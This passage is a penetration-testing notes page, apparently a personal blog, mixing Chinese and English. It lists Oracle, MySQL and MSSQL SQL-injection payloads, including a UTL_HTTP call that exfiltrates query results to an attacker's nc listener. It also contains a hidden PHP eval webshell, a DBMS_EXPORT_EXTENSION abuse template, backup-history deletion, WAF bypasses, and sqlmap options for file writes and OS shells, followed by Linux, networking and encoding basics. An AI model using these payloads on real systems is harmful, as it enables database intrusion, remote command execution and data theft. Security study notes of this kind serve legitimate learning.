title="Oracle:查询判断"></a>Oracle:查询判断</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span> exist<span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span> 或者 <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> user_tables<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原理是dural表和user_tables表是Oracle中的系统表，返回正常则为Oracle。</p><p>获取基本信息：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#获取数据库版本</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> banner <span class="token keyword">from</span> sys<span class="token punctuation">.</span>v_$version <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> dual<span class="token comment" spellcheck="true">#get current username</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USERENV'</span><span class="token punctuation">,</span><span class="token string">'CURRENT_USER'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> dual<span class="token comment" spellcheck="true">#get log path</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> instance_name <span class="token keyword">from</span> v$instance<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测数据库，表和列名</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#get first database</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> owner <span class="token keyword">from</span> all_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> dual<span class="token comment" spellcheck="true">--+ get all databases, first_dbname is the name of the first database</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> owner <span class="token keyword">from</span> all_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> owner<span class="token operator">&lt;></span><span class="token string">'first_dbname'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> dual<span class="token comment" spellcheck="true">--表等类似于上</span><span class="token comment" spellcheck="true">--表名采用大小写的匹配模式，因此需要启用模糊搜索</span><span class="token comment" spellcheck="true">--例如查询数据库中含密码字段的表名：</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> usr_tab_columns <span class="token keyword">where</span> column_name <span class="token operator">like</span> <span class="token string">'%25pass%25'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Oracle注入中严格要求各个字段的类型必须和定义一致，可以通过下面的代码进行判断字段类型：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'null'</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>UTL_HTTP储存过程反弹注入</p><p>Oracle中提供utl——http.request的包函数，用于取得远程web服务器的请求信息，因为可以用它来反弹回信息。方式如下：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span> exist <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_name<span class="token operator">=</span><span class="token string">'UTL_HTTP'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--判断UTL_HTTP是否可用    </span><span class="token operator">and</span> utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'your nc'</span><span class="token operator">||</span><span class="token punctuation">(</span>SQL Quesry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">and</span> utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'your nc'</span><span class="token operator">||</span><span class="token punctuation">(</span>selcet banner <span class="token keyword">from</span> sys<span class="token punctuation">.</span>v_$version <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--</span><span class="token comment" spellcheck="true">--注入点执行，每次提交之后nc会断开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合上面的UTL_http可通过web注射添加系统账户</p><p>使用的函数为：</p><pre class="line-numbers language-sql"><code class="language-sql">SYS<span class="token punctuation">.</span>DBMS_EXPORT_EXTINSION<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>DOMAIN_INDEX_TABLES<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应用方法为：</p><pre class="line-numbers language-sql"><code class="language-sql">SYS<span class="token punctuation">.</span>DBMS_EXPORT_EXTINSION<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>DOMAIN_INDEX_TABLES<span class="token punctuation">(</span><span class="token string">'FOO'</span><span class="token punctuation">.</span><span class="token string">'BAR'</span><span class="token punctuation">,</span><span class="token string">'DBMS_OUTPUT'</span><span class="token punctuation">.</span>put<span class="token punctuation">(</span>:p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>Attack<span class="token operator">-</span>Command<span class="token punctuation">]</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">--',SYS',0,'1',0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内网常见弱口令：oracle/oracle</p><p>​    </p><h3 id="Advanced-Tips："><a href="#Advanced-Tips：" class="headerlink" title="Advanced Tips："></a>Advanced Tips：</h3><p>S1:find login pages</p><p>S2: Make a list of SQL payloads, hit on the login pages with Intruder</p><p>S3:Check for SQL Query in error/response</p><p>S4:SQL Map</p><p>Reference:</p><p><a href="https://medium.com/@mudassirsharief58/hunt-for-sql-injection-the-smart-way-db85243a4e90" target="_blank" rel="noopener">https://medium.com/@mudassirsharief58/hunt-for-sql-injection-the-smart-way-db85243a4e90</a> </p><p>Mysql 中的 backupmediafamily会显示备份过的历史记录,删除方法为下：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">delete</span> <span class="token keyword">FROM</span> <span class="token punctuation">[</span>msdb<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>backupmediafamily<span class="token punctuation">]</span> <span class="token keyword">where</span> media_set_id<span class="token operator">=</span><span class="token string">'13'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>备份以写入webshell</p><p>创建隐藏webshell：</p><pre class="line-numbers language-sql"><code class="language-sql">echo <span class="token operator">^</span><span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>request<span class="token punctuation">[</span>xxx<span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">^</span><span class="token operator">>></span><span class="token keyword">index</span><span class="token punctuation">.</span>php:<span class="token number">a</span><span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用concat函数进行多种查询：</p><pre class="line-numbers language-sql"><code class="language-sql">concat_ws<span class="token punctuation">(</span>char<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+ group_concat()同理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>双注入：由于双注入的盲注一般也可以，就大概讲一下原理。group by会产生一个虚拟表，然后rand配合floor函数会生成0或1的值，这个时候用concat拼接就会报错，然后就可以使用语句：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span> 注入爆数据语句<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>@@datadir；@@basedir ：列出本地路径</p><p>我对这里面的a和b有点不解，他们是floor（rand（））函数生成的0/1的值吗，然后group by会对他们分组，然后concat会使他们报错。</p><p>但是我看有的说这个a和b是在使用group by的时候产生的那个虚拟表来带进去，因为这里面的0/1所以会报错，然后产生注入。。。（但是我对0/1为什么会产生报错有点不解），以及为什么要用concat函数进行拼接</p><p>写入shell注意点：</p><p>GPC开启还是关闭；PHP是否主动转换</p><p>General-log选项获取webshell</p><p>判断xp_cmdshell是否存在:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><p>%09(tab)</p><p>%0a（换行符）</p><pre><code>post:id=1%09and%091=2id=1%0aand%0a1=2</code></pre><p>判断数据库类型及表和字段</p><pre><code>SQL Server第一条会正常运行，access会两条都异常and%0a(select%0acount(*)%0afrom%0asysobjects)&gt;0and%0a(select%0acount(*)%0afrom%0amsysobjects)&gt;0</code></pre><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><pre><code>/*!/*!select*/</code></pre><h3 id="Tools-1"><a href="#Tools-1" class="headerlink" title="Tools"></a>Tools</h3><p>Sql injection payload: <a href="https://github.com/payloadbox/sql-injection-payload-list.git">https://github.com/payloadbox/sql-injection-payload-list.git</a></p><p>adminner.php(脱裤)</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><p>有用的目录：</p><p>sqlmap/extra : beep；cloak（生成和解密后门），dbgtool（ascii文本转换为便携式exe），icmpsh shell（win32），mssqlsig（获取最新的sqlsever版本），runcmd，safe2bin（转换bin文件），shellcodeexec。</p><p>Sqlmap/lib： 执行sqlmap时调用的库</p><p>Sqlmap/procs：储存进程访问</p><p>sqlmap/shell： backdoors，stagers</p><p><strong>Sqlmap/tamper</strong></p><p>Sqlmap/thirdparty：第三方插件</p><p>Sqlmap/TXT:字典文件夹</p><p>sqlmap/udf：提权工具</p><p>sqlmap/waf：对waf进行检测</p><p>sqlmap/xml（信息记录）</p><p>Sqlmap/Plugin</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>–forms:自动搜索表单的方式</p><p>-d connect to direct database Eg: </p><pre><code>python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --bann\er --dbs --users</code></pre><p>–technique: </p><pre><code>B: Boolean-based blindE: Error-basedU: Union query-basedS: Stacked queriesT: Time-based blindQ: Inline queries</code></pre><p>-v 0-6: 3(show payload); 4(http request); 5(http response)</p><p>–method=METHOD:http mehtod(such as put or trace)</p><p>–data=DATA:通过post发送数据参数。 Eg：–data=”id=1” -f –banner –dbs –users.</p><p>–user-agent=AGENT / –random-agent</p><p>–refer=*</p><p>–auth-cred=AUTH:  Eg:(name:pass)</p><p>–retries=*</p><p>–randomize=*(某一参数的随机变化，长度和类型会与提供的初始值一样）)</p><p>–csrf-token=CSR：参数用来保存anti-csrf令牌</p><p>–csrf-url=* ：url地址访问提取anti-csrf令牌</p><p>–force-ssl：强制使用ssl/https</p><p>–hhp：使用http参数污染的方法</p><p>–eval=EVALCODE ： 当需要根据某个参数的变化而去修改另一个参数时，可以使用–eval根据编写的python代码而修改请求。Eg：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span>eval<span class="token operator">=</span><span class="token string">"import hashlib;id2=hashlib.md5(id).hexdigest()"</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-o:打开所有优化选项</p><p>–keep-alive</p><p>–null-connection:获取页面长度</p><p>–threds=*</p><p>-p=*：测试参数</p><p>–skip=*</p><p>–skip-static(跳过不显示为动态参数的测试）</p><p>–perfix=*：注入payload字符串前缀</p><p>–suffix=* 同上</p><p>–code=*:查询求值为True时匹配的http代码</p><p>–union-cols=*：规定列范围用于测试union查询注入</p><p>–union-from=*:sql注入union查询使用的格式</p><p>–dns-domain=*:DNS泄露攻击使用的域名</p><p>-f：执行dbms版本指纹检查</p><p>-a：获取所有信息</p><p>-b:get banner</p><p>–current(-user/-db)</p><p>–hostname</p><p>–is-dba</p><p>–users/passwords/privileges/roles</p><p>–dbs/tables/columns/</p><p>–schema:枚举数据库架构</p><p>–count：检索表的项目数（统计表中的数据个数）</p><p>–dump(-all)</p><p>–search :列，表，数据库</p><p>–comments：获取dbms注释</p><p>-D/T/C/U(user)</p><p>–sql-query=*：要执行的sql语句</p><p>–sql-shell</p><p>–sql-file=*同上</p><p>–common-tables/-columns:检查存在的共同表/列</p><p>–file(-read/write/dest)=* Eg:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">--file-write "/software/nc.exe" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–os-cmd=*</p><p>–os-shell</p><p>–os-pwn:获取一个oob shell，meterpreter或vnc</p><p>–os-smbrelay：一键获取一个oob shell，meterpreter或vnc</p><p>–os-bof：储存过程缓冲区溢出利用</p><p>–priv-esc：数据库用户权限提升</p><p>–msf-path=*</p><p>–tmp-path=*：远程临时文件的绝对目录</p><p><strong>当后端是DBMS时MySql，PostgreSQL或Microsoft SQL Server，并且WEB应用程序支持堆查询时，sqlmap可访问windows注册表。此外，会话用户必须具有相应权限。</strong></p><p>-s：保存和恢复检索会话文件中的所有数据，将注入过程保存到一个文件，可以中断并随时恢复（Eg：-s”xx.log”/-s”xx.log” –resume).</p><p>-t :记录所有http流量到一个文本文件中</p><p>–charset=*：字符编码</p><p>–crawl=*：爬虫</p><p>–dump-format=（csv，html，sqlite）</p><p>–flush-seesion：刷新当前目标的会话文件</p><p>–forms：解析和测试目标url表单</p><p>–output-dir=*</p><p>–parse-errors：解析和显示响应数据库错误信息</p><p>–save：保存选项到ini配置文件</p><p>–alert</p><p>-m：批量</p><p>–beep：警告发现注入</p><p>–cleanup：清除sqlmap注入时在dbms中产生的udf和表</p><p>–disable-coloring</p><p>–identify-waf</p><p>–purge-output：删除outpu目录与之前所有目标的信息</p><p>–web-root=*</p><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>猜测的表名等一般都会放在sqlmap/txt/common-xxx.txt：可以平时做补充</p><p>UDF文件上传（sqlmap）</p><p>/*为MySql注释符</p><p>–+为Oracle和MSSQL注释符</p><p>获取远程终端端口命令：</p><pre class="line-numbers language-cmd"><code class="language-cmd">tasklist /svc | find "Term" or "TermService"svchost.exe 7100 TermService #7100为上面Term找到的的值netstat -ano | find "7100"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><p>统计数据库中数据计数：</p><p>sqlmap -u xx.m -D database –count</p><p>file-write：</p><p>–file-write ‘local file’ –file-dest ‘new file location on sever’</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>日志</p><p>apache目录access log</p><h4 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h4><p>Less</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0lptwg4ij30fx0gsmzd.jpg" alt="截屏2020-06-21 下午4.39.20"></p><p>Cp -r (file)</p><p>cp */?/[].filename</p><p>cp -i (safemod)</p><p>cp -rp /dir{file1,file2,file3} /finaldir (muti files)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -r css/ images/ js/ backups/ ar/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0lps3ldxj30g10mktci.jpg" alt="截屏2020-06-21 下午4.44.50"></p><p>mv file1 file2 /dir</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> -t <span class="token operator">&lt;</span>desination<span class="token operator">></span> <span class="token operator">&lt;</span>src1<span class="token operator">></span><span class="token operator">&lt;</span>src2<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0lpqytoij30g10mkwgl.jpg" alt="截屏2020-06-21 下午4.48.52"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0lptg95kj30g10mkjt9.jpg" alt="截屏2020-06-21 下午4.50.28"></p><p>head/tail</p><p>Head -n (number of line)</p><p>tail -f (interact mod: able to see what’s adding to the file )</p><p>Expand/unexpand(turn TABs to spaces or reverse)</p><p>Eg:</p><p>Unexpand -a xx.txt</p><p>Join</p><pre><code>file1.txt1 John2 Jane3 Maryfile2.txt1 Doe2 Doe3 Sue$ join file1.txt file2.txt1 John Doe2 Jane Doe3 Mary Sue</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0we2s6gbj30g10mkaca.jpg" alt="截屏2020-06-21 下午9.42.37"></p><p>sort</p><pre><code>file1.txtdogcowcatelephantbird$ sort file1.txtbirdcatcowdogelephant</code></pre><p>-r reverse</p><p>-n numerical or alphabetic </p><p>Tr </p><p>The tr (translate) command allows you to translate a set of characters into another set of characters.</p><p>Eg: tr a-z A-Z</p><p>hello</p><p>HELLO</p><p>uniq</p><p>remove all the duplicates</p><p>-c count the occurrences</p><p>-u get unique values</p><p>-d get duplicate values</p><p><em><em>Note : uniq does not detect duplicate lines unless they are adjacent. </em></em></p><p>so we use this command:</p><pre><code>sort xx.txt | uniq</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0we16knrj30g10mkdjz.jpg" alt="截屏2020-06-21 下午9.20.31"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0wdz0vjpj30g10mktbk.jpg" alt="截屏2020-06-21 下午9.31.37"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0we03c35j30g10mkdhb.jpg" alt="截屏2020-06-21 下午9.32.57"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0we20l1uj30g10mkdh9.jpg" alt="截屏2020-06-21 下午9.50.34"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg0wdxlpd1j30g10mkmze.jpg" alt="截屏2020-06-21 下午9.52.57"></p><h3 id="Linux-common-checking-commands"><a href="#Linux-common-checking-commands" class="headerlink" title="Linux common checking commands"></a>Linux common checking commands</h3><pre><code>su -namels -la/ltsudo -ldpkg -l file (check for vuln,such as sudo version)find / -perm -4000 2&gt;dev/null (any privsec)cat /etc/crontab /etc/passwd</code></pre><h4 id="suspecious-file-names"><a href="#suspecious-file-names" class="headerlink" title="suspecious file names:"></a>suspecious file names:</h4><p>.bash_history</p><p>corn jobs</p><p>update-motd.d</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>wce；g64；mimikatz（抓取密码）</p><p>pskill（关闭杀软）：第一次使用的时候后面要添加“/accepteula”。 net stop xxx /y</p><p>msg:search suggester</p><p>windows/linux suggester</p><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>iis短文件名：404文件存在，400不存在。Wildcard为～*</p><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>日志</p><p>bash_history</p><p>网络连接</p><p>流量</p><p>访问记录</p><p>find grep</p><p>最近更新的文件</p><p>可疑行为</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>反射性xss和DOM类型差别</p><p>DOM：打在JS里，html无差别， dom节点。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="ascii-to-url-ascii-code-hex-0xasciicode："><a href="#ascii-to-url-ascii-code-hex-0xasciicode：" class="headerlink" title="ascii to url(%ascii code) hex(0xasciicode："></a>ascii to url(%ascii code) hex(0xasciicode：</h3><p>ascii的码加上%做前缀就是url编码，加0x就是hex（16进制）编码</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>ascii</td><td>url</td></tr><tr><td>space</td><td>%20</td></tr><tr><td>!</td><td>%21</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>#</td><td>%23</td></tr><tr><td>$</td><td>%24</td></tr><tr><td>%</td><td>%25</td></tr><tr><td>&amp;</td><td>%26</td></tr><tr><td>‘</td><td>%27</td></tr><tr><td>(</td><td>%28</td></tr><tr><td>)</td><td>%29</td></tr><tr><td>*</td><td>%2A</td></tr><tr><td>+</td><td>%2B</td></tr><tr><td>,</td><td>%2c</td></tr><tr><td>-</td><td>%2D</td></tr><tr><td>.</td><td>%2E</td></tr><tr><td>/</td><td>%2F</td></tr><tr><td>:</td><td>%3A</td></tr><tr><td>;</td><td>%3B</td></tr><tr><td>&lt;</td><td>%3C</td></tr><tr><td>=</td><td>%3D</td></tr><tr><td>&gt;</td><td>%3E</td></tr><tr><td>?</td><td>%3F</td></tr><tr><td>@</td><td>%40</td></tr><tr><td>A</td><td>%41</td></tr><tr><td>\</td><td>%5C</td></tr><tr><td>_</td><td>%5F</td></tr><tr><td>|</td><td>%7C</td></tr><tr><td>tab</td><td>%09</td></tr><tr><td>\n换行</td><td>%0a</td></tr></tbody></table><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><ul><li><code>&quot;</code>转<code>&quot;</code></li><li><code>&amp;</code>转<code>&amp;</code></li><li><code>&#39;</code>转<code>&#39;</code></li><li><code>&lt;</code>转<code>&lt;</code></li><li><code>&gt;</code>转<code>&gt;</code></li></ul><h3 id="二进制与十进制的转换"><a href="#二进制与十进制的转换" class="headerlink" title="二进制与十进制的转换"></a>二进制与十进制的转换</h3><p>128    64    32    16    8    4    2    1</p><p>当想要从十进制转化到二进制时便从这里面相加</p><p>例如 14</p><p>14=8+4+2（1不满足所以为0）：所以为1110</p><p>3=2+1=11</p><p>4=4（2，1）=100</p><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="网段"><a href="#网段" class="headerlink" title="网段"></a>网段</h3><p>子网掩码：</p><p>它是一种用来指明一个IP地址的哪些位标识的是主机所在的<strong>子网</strong>，以及哪些位标识的是主机的位<strong>掩码</strong>。</p><p>同一网段：</p><p>192.168.5.5    255.255.255.0</p><p>192.168.5.160    255.255.255.0</p><p>因为子网掩码有三个255，所以看前三个数：192.168.5，相同所以在同一网段</p><p>————————————————————————</p><p>192.168.8.5    255.255.0.0</p><p>192.168.5.160    255.255.0.0（subnet mask same)</p><p>因为子网掩码有两个255，所以看前两个数：192.168，相同所以在同一网段</p><p>不同网段</p><p>192.168.5.9 /24    192.168.6.9/24</p><p>192.168.5.9/16    192.17.5.9/16</p><p>注意1：相同网段的pc可以直接通信，不同网段的pc需要路由器做中转</p><p>注意2:相同网段的pc不需要网关，不同网段的pc需要配置网关</p><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h2 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Subdomain : JS link find(go spider),subdomain brute( sublist3r, one for all). Url去重</p><p>批量检测是否可ping通</p><p>Port analysis: masscan -p1-65535 -iL new_dxy.txt –max-rate 1800 -oG domain.log (ip only);  dnsmasscan(domain and ip both) or Simaple brute for all services(nmap + brutespary)</p><p>Nmap Command for files:</p><pre class="line-numbers language-swift"><code class="language-swift">sudo nmap <span class="token operator">-</span>sS <span class="token operator">-</span><span class="token builtin">Pn</span> <span class="token operator">-</span>n <span class="token operator">--</span>open <span class="token operator">--</span><span class="token builtin">min</span><span class="token operator">-</span>hostgroup <span class="token number">4</span> <span class="token operator">--</span><span class="token builtin">min</span><span class="token operator">-</span>parallelism <span class="token number">1024</span> <span class="token operator">--</span>host<span class="token operator">-</span>timeout <span class="token number">30</span> <span class="token operator">-</span><span class="token builtin">T4</span> <span class="token operator">-</span>v <span class="token operator">-</span>oG result<span class="token punctuation">.</span>txt <span class="token operator">-</span>iL ip<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>suspecious fiels (github info search (for code check or deafult pass and so on); svn; db, etc)</p><p>eyewitness(httpscreenshot)</p><p>cat xx.txt | python3 smuggler.py(http smuggling test)</p><p>phpMyAdmin搜索</p><p>扫描器初步扫描（x-ray对于批量支持蛮不错的）</p><p>CMS指纹识别</p><p>端口爆破</p><p>special wordlist generate</p><h3 id="Attacking-Tips"><a href="#Attacking-Tips" class="headerlink" title="Attacking Tips"></a>Attacking Tips</h3><p>常见的sql注入：登录页面fuzz，apk里的参数，http header等</p><p>APP渗透</p><p>XSS盲打</p><p>关注操作系统，版本，waf以及请求头和返回的信息</p><p>http smuggling测试</p><p>token，id，cookie修改</p><p>修改请求方式</p><h2 id="安全防范与日志检查"><a href="#安全防范与日志检查" class="headerlink" title="安全防范与日志检查"></a>安全防范与日志检查</h2><h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><h4 id="清除后门文件"><a href="#清除后门文件" class="headerlink" 